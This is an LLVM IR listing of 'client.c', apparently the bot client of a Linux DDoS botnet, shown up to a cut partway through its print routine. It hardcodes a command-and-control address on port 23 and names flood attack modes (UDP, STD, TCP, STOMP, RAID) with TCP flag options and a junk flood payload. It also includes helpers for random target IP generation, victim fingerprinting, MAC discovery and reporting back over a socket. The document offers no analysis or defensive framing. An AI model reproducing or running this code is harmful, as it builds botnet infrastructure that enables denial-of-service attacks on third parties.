; ModuleID = 'client.c'
source_filename = "client.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.5 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }

@.str = private unnamed_addr constant [18 x i8] c"185.244.25.189:23\00", align 1
@commServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@pids = dso_local global i32* null, align 8
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.11 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@__const.astd.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.11, i32 0, i32 0)], align 8
@.str.12 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"Python\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"/usr/bin/python3\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"Python3\00", align 1
@.str.17 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"Perl\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"Unknown File\00", align 1
@.str.20 = private unnamed_addr constant [17 x i8] c"usr/sbin/telnetd\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"SSH\00", align 1
@.str.22 = private unnamed_addr constant [15 x i8] c"Unknown Device\00", align 1
@.str.23 = private unnamed_addr constant [3 x i8] c"22\00", align 1
@.str.24 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.25 = private unnamed_addr constant [13 x i8] c"Unknown Port\00", align 1
@.str.26 = private unnamed_addr constant [17 x i8] c"/usr/bin/apt-get\00", align 1
@.str.27 = private unnamed_addr constant [14 x i8] c"Ubuntu/Debian\00", align 1
@.str.28 = private unnamed_addr constant [17 x i8] c"/usr/lib/portage\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"Gentoo\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"/usr/bin/yum\00", align 1
@.str.31 = private unnamed_addr constant [12 x i8] c"REHL/Centos\00", align 1
@.str.32 = private unnamed_addr constant [15 x i8] c"/var/lib/YaST2\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"Open Suse\00", align 1
@.str.34 = private unnamed_addr constant [15 x i8] c"Unknown Distro\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"STOMP\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"RAID\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.41 = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.44 = private unnamed_addr constant [242 x i8] c"\1B[1;37m[\1B[0;36mShelling\1B[1;37m]\1B[0;36m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[0;36m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[0;36m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[0;36m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[0;36m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[0;36m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @init_rand(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomIP(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !8

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #11
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

16:                                               ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0)) #11
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #10
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

29:                                               ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

30:                                               ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #11
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

37:                                               ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

42:                                               ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0)) #12
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %52, i8** %9, align 8
  br label %53

53:                                               ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53, !llvm.loop !9

61:                                               ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

63:                                               ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 4096, i1 false)
  br label %42, !llvm.loop !10

65:                                               ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

71:                                               ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #11
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #11
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.0* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i64 0, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

94:                                               ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79, !llvm.loop !11

97:                                               ; preds = %79
  br label %98

98:                                               ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

101:                                              ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #5

declare i32 @close(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #12
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #12
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !12

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #12
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !13

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !14

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #5

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sockprintf(i32 %0, i8* %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias align 16 i8* @malloc(i64 2048) #11
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #12
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #12
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #11
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @print(i8** %0, i8* %1, %struct.__va_list_tag* %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
